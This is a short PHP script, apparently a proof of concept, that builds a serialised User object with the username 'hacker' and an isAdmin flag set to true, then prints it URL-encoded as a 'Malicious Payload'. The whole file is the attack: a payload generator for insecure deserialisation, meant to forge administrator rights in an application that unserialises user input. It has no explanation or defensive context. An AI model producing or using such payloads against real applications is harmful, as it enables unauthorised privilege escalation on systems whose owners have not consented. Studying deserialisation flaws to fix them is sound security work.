<?php
class User {
    public $username = "hacker";
    public $isAdmin = true;
}

$payload = serialize(new User());
echo "Malicious Payload: " . urlencode($payload);
?>
